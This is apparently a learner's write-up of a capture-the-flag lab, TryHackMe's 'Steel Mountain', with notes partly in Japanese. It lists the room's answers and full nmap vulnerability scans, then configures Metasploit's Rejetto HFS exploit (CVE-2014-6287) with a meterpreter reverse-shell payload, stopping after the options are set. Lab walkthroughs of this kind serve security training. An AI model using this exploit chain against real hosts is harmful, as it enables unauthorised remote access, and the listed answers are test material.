# Task1 Introduction

In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

f you don't have the right security tools and environment, deploy your own Kali Linux machine and control it in your browser, with our Kali Room.

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

Deploy the machine.

Who is the employee of the month?  
→**Bill Harper**

kaliのfirefoxでブラウザ表示すると写真表示されパスを表示するとpng名の中に名前がある

## Task 2  Initial Access

Now you have deployed the machine, lets get an initial shell!


Scan the machine with nmap. What is the other port running a web server on?  
→**8080**

```
Starting Nmap 7.60 ( https://nmap.org ) at 2022-06-09 15:33 BST
Nmap scan report for ip-10-10-45-70.eu-west-1.compute.internal (10.10.45.70)
Host is up (0.0018s latency).
Not shown: 989 closed ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
8080/tcp  open  http-proxy
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
MAC Address: 02:7C:DD:98:A1:17 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 62.42 seconds
```

* Take a look at the other web server. What file server is running?

    * HTTP file server (HFS)2.3で検索し、Rejetto HTTP File Serverを得る
    ```
    # nmap -sV --script vuln 10.10.98.7
    Not shown: 989 closed ports
    PORT      STATE SERVICE      VERSION
    80/tcp    open  http         Microsoft IIS httpd 8.5
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-server-header: Microsoft-IIS/8.5
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    135/tcp   open  msrpc        Microsoft Windows RPC
    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
    3389/tcp  open  ssl          Microsoft SChannel TLS
    |_ssl-ccs-injection: No reply from server (TIMEOUT)
    | ssl-dh-params: 
    |   VULNERABLE:
    |   Diffie-Hellman Key Exchange Insufficient Group Strength
    |     State: VULNERABLE
    |       Transport Layer Security (TLS) services that use Diffie-Hellman groups
    |       of insufficient strength, especially those using one of a few commonly
    |       shared groups, may be susceptible to passive eavesdropping attacks.
    |     Check results:
    |       WEAK DH GROUP 1
    |             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
    |             Modulus Type: Safe prime
    |             Modulus Source: RFC2409/Oakley Group 2
    |             Modulus Length: 1024
    |             Generator Length: 1024
    |             Public Key Length: 1024
    |     References:
    |_      https://weakdh.org
    |_sslv2-drown: 
    8080/tcp  open  http         HttpFileServer httpd 2.3
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-fileupload-exploiter: 
    |   
    |     Couldn't find a file-type field.
    |   
    |_    Couldn't find a file-type field.
    | http-method-tamper: 
    |   VULNERABLE:
    |   Authentication bypass by HTTP verb tampering
    |     State: VULNERABLE (Exploitable)
    |       This web server contains password protected resources vulnerable to authentication bypass
    |       vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
    |        common HTTP methods and in misconfigured .htaccess files.
    |              
    |     Extra information:
    |       
    |   URIs suspected to be vulnerable to HTTP verb tampering:
    |     /~login [GENERIC]
    |   
    |     References:
    |       http://capec.mitre.org/data/definitions/274.html
    |       https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29
    |       http://www.mkit.com.ar/labs/htexploit/
    |_      http://www.imperva.com/resources/glossary/http_verb_tampering.html
    |_**http-server-header: HFS 2.3**
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    | http-vuln-cve2011-3192: 
    |   VULNERABLE:
    |   Apache byterange filter DoS
    |     State: VULNERABLE
    |     IDs:  OSVDB:74721  CVE:CVE-2011-3192
    |       The Apache web server is vulnerable to a denial of service attack when numerous
    |       overlapping byte ranges are requested.
    |     Disclosure date: 2011-08-19
    |     References:
    |       http://seclists.org/fulldisclosure/2011/Aug/175
    |       http://osvdb.org/74721
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
    |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
    |_      http://nessus.org/plugins/index.php?view=single&id=55976
    49152/tcp open  msrpc        Microsoft Windows RPC
    49153/tcp open  msrpc        Microsoft Windows RPC
    49154/tcp open  msrpc        Microsoft Windows RPC
    49155/tcp open  msrpc        Microsoft Windows RPC
    49156/tcp open  msrpc        Microsoft Windows RPC
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port3389-TCP:V=7.60%I=7%D=6/20%Time=62B05FC3%P=x86_64-pc-linux-gnu%r(TL
    SF:SSessionReq,346,"\x16\x03\x03\x03A\x02\0\0M\x03\x03b\xb0_\xbe\x01\x06\\
    SF:\x95\x0b\xaft\xf5\x9e\x0cV\xc4\xad\xc6\xf4\x7ft,,\xfa/\xbb\xcaE0\xd1\xf
    SF:eR\x20J'\0\0\x81\x88l0\x95\xe3\x9d5\xa7\xba\xb0\xdd\x1b\xf3\x890iS\xe4D
    SF:\x9d\xb46'\xbe\xd7_\xf3\0/\0\0\x05\xff\x01\0\x01\0\x0b\0\x02\xe8\0\x02\
    SF:xe5\0\x02\xe20\x82\x02\xde0\x82\x01\xc6\xa0\x03\x02\x01\x02\x02\x10,\x2
    SF:0\xc4\r\xb52\xeb\x86G\x0e\+\xc7\xed\"x\xf00\r\x06\t\*\x86H\x86\xf7\r\x0
    SF:1\x01\x05\x05\x000\x181\x160\x14\x06\x03U\x04\x03\x13\rsteelmountain0\x
    SF:1e\x17\r220619114226Z\x17\r221219114226Z0\x181\x160\x14\x06\x03U\x04\x0
    SF:3\x13\rsteelmountain0\x82\x01\"0\r\x06\t\*\x86H\x86\xf7\r\x01\x01\x01\x
    SF:05\0\x03\x82\x01\x0f\x000\x82\x01\n\x02\x82\x01\x01\0\xb8\"~\x14OTx'\xc
    SF:8\xce\xef\x17\x19\x04\xc2\x90\xf1E\xb7\xa3\]\xfa\xf2\x7f\|\xafr!\xf2\xc
    SF:c\x1cd\x9a\x9a`\xc3\xc3\xb1\x04\xb3\*\tL\xde\xe8o/%p\xc9\xe3Ov\x9bV&\x0
    SF:fjcr\xac}\xd3v\*\xc9\xe9\xfb3\x1c\x1aU\xc9q<\xb9@\x1c\xd9b\+\xa3\xae\xe
    SF:d\x89\xb0\x7f\xbaw&\x8aq\xd2:\xf3\*\xa0!\^\xbb\x1f~\xfa\xe5\x1b\]w\x81Z
    SF:M\x95,\xd9x\xd4u\x8d\xba\x91\xee\xeb\x94BCp\xfd\xbc\x88\xd4\xe8s\xdaxJ\
    SF:xb7\x924\xa3\)\xcf#S_i\x0fu\x84\xa1\x9d\x9f\xd5\xde\xed\x8b\0\xa0u\xb1;
    SF:\xff\$j\xfb\x06W\xec\x98\xb6\xf3'\x1c\x20x\x8a\x032\xfdp\xb1\xea\xa3\x9
    SF:9\xb9\xa9\x06X\xd9\x7fx\xfd\xeb\x0eV\x87\]n\x81\x02\xad\x95QjPW\xe5\xbf
    SF:\x14\$\xa51L\0\xd3\x9c\xaf\x91\xf7\xab\xda\$8\x9c\xe1\xa1\xfc\xdco\x0b\
    SF:x8c\x10\xbc\xbb\xff;z\xc2\\\xcb\x94p\xa0_\n\xe3\xcd\xe1\xa8\\\xee\x84\x
    SF:d2:\xf3k\x0e\x9d\x02\x03\x01\0\x01\xa3\$0\"0\x13\x06\x03U\x1d%\x04\x0c0
    SF:\n\x06\x08\+\x06\x01\x05\x05\x07\x03\x010\x0b\x06\x03U\x1d\x0f\x04\x04\
    SF:x03\x02\x0400\r\x06\t\*\x86H\x86\xf7\r\x01\x01\x05\x05\0\x03\x82\x01\x0
    SF:1\0\xb1/\xd6\x81\xd4j\x83{\xe7\xde6\|\xff\xfd\xaf\xf5\xc0\xec\x9dZlNJrg
    SF:\x19\xc2\x1appTZ\x87\x11a\n\xd7\xac\xa3`#M\xd4\xd3\x99<'\xd5p\x15\xfeU\
    SF:xd3\x9a\xf5F\xc3\x85\x1e~BZl\xd8#>\x90\xf2\xe8\x0e\x05t\xa3\xe0\xc4B\x8
    SF:6\x14\x1d\xb8\+\x99U\xfeQ\xcbc\xe9\xb5\x8f0\xbb\x95f\x0c\xd0\x9e\xd6\x8
    SF:84f\x81}\xd6#k\x87\xd4\xfb\xd3\xd6}\x06&\xf3\x89\n\xf3dp\x1c\+jf\xbd6F\
    SF:xb3jC\^I\x11\*Y\x95\n\xe2\x90\xfeC\xaaQ\x80\xb4\x1f\x89\xac\xd2\xce\xb5
    SF:A\x84\x13K\x8f\0\x0b\x1e\xa3L\xc2wV\xdf\xed\x95u\t7\xdeum\x9a\0\xb2\xce
    SF:qYz\xfc\xc5\xe3\)\xd0\xa2kW\xea\x03K\xcaC<c\x84\xffr\xede\xcdX\r\xfb\x9
    SF:6\x88\xc1p\x91EsY\x1e\x9a\x20\xde\x18\xef\xf2H\x05&\xfcY\x110;\x06\xfbQ
    SF:ty#f\?\xfb\xd2\xcdv\xd1\xb44\x85\r\xc7\xbeA\x8b\xd4\xefrRgr\x8a1\x0e\0\
    SF:0\0");
    MAC Address: 02:14:94:D5:F3:33 (Unknown)
    Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_samba-vuln-cve-2012-1182: No accounts left to try
    |_smb-vuln-ms10-054: false
    |_smb-vuln-ms10-061: No accounts left to try

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 258.00 seconds


* What is the CVE number to exploit this file server?

    * [参考サイト HFS2.3で検索すると引っかかる](https://www.exploit-db.com/exploits/39161)

    * answer ：　2014-6287 

* Use Metasploit to get an initial shell. What is the user flag?

    * cve番号からモジュールを探す

        ```bash
        msf5 > search cve:2014-6287

        Matching Modules
        ================

        #  Name                                   Disclosure Date  Rank       Check  Description
        -  ----                                   ---------------  ----       -----  -----------
        0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
        ```

    * moduleを選択する

        ```bash
        msf5 > use exploit/windows/http/rejetto_hfs_exec
        [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
        msf5 exploit(windows/http/rejetto_hfs_exec) > Interrupt: use the 'exit' command to quit
        ```

    * show options

        ```bash
        msf5 exploit(windows/http/rejetto_hfs_exec) > show options

        Module options (exploit/windows/http/rejetto_hfs_exec):

        Name       Current Setting  Required  Description
        ----       ---------------  --------  -----------
        HTTPDELAY  10               no        Seconds to wait before terminating web server
        Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
        RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
        RPORT      80               yes       The target port (TCP)
        SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
        SRVPORT    8080             yes       The local port to listen on.
        SSL        false            no        Negotiate SSL/TLS for outgoing connections
        SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
        TARGETURI  /                yes       The path of the web application
        URIPATH                     no        The URI to use for this exploit (default is random)
        VHOST                       no        HTTP server virtual host


        Payload options (windows/meterpreter/reverse_tcp):

        Name      Current Setting  Required  Description
        ----      ---------------  --------  -----------
        EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
        LHOST     10.10.79.132     yes       The listen address (an interface may be specified)
        LPORT     4444             yes       The listen port


        Exploit target:

        Id  Name
        --  ----
        0   Automatic
        ```

    * PAYLOADの設定

        ```bash
        msf5 exploit(windows/http/rejetto_hfs_exec) > set PAYLOAD windows/meterpreter/reverse_tcp
        PAYLOAD => windows/meterpreter/reverse_tcp
        ```

    * OPTIONSの設定

        ```
        msf5 exploit(windows/http/rejetto_hfs_exec) > set RHOST 10.10.98.7
        RHOST => 10.10.98.7
        msf5 exploit(windows/http/rejetto_hfs_exec) > set LHOST 10.10.79.132
        LHOST => 10.10.79.132
        msf5 exploit(windows/http/rejetto_hfs_exec) > set SRVHOST 10.10.79.132
        SRVHOST => 10.10.79.132
        ```



    
